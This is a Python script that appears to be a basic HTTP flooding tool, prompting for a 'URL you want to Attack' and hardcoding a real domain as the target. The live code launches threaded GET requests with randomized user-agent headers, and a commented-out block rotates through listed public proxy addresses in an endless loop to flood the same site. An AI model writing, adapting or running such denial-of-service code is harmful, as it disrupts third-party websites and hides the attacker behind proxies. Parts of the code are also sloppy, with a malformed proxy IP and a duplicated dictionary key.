import requests
from fake_useragent import UserAgent
import random
import threading


def random_user_agent():
    user_agent = UserAgent()
    headers ={
        'User-Agent': user_agent.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    }
    return headers

# url=input("Enter the URL you want to Attack:")
# Thread =int(input("Enter the No: of Threads:"))
url = "https://centinels.zeal.ninja/"
Thread = 10

def send_req(url):
#     proxy = {
#     'http': 'http://115.96.208.124:8080',
#     'https': 'https://1115.96.208.124:8080'
# }
     
    try:
     res = requests.get(url, headers=random_user_agent())
    except Exception as e:
        print(f"Error making request to {url}: {e}")  


threads =[]

i=0
while i <= Thread:
    thread = threading.Thread(target=send_req, args=(url,))
    thread.start()
    threads.append(thread)
    i += 1

for thread in threads:
    thread.join()    










# List of proxies
# proxies = [
#     'https://36.93.68.47:41890',
#     'https://186.3.91.110:999',
#     'https://113.160.37.152:53281',
#     'https://190.97.236.40:2023',
#     # Add more proxies as needed
# ]
#
# # Target URL
# target = 'https://centinels.zeal.ninja/'
#
# def send_request():
#     # Select a random proxy
#     proxy = random.choice(proxies)
#     try:
#         # Send a request using the proxy
#         requests.get(target, proxies={'https': proxy, 'https': proxy})
#     except:
#         pass
#
# # Get the number of threads from the user
# num_threads = int(input('Enter the number of threads: '))
#
# # Loop indefinitely
# while True:
#     # Create and start threads
#     threads = []
#     for _ in range(num_threads):
#         t = threading.Thread(target=send_request)
#         t.start()
#         threads.append(t)
#
#     # Wait for all threads to finish
#     for t in threads:
#         t.join()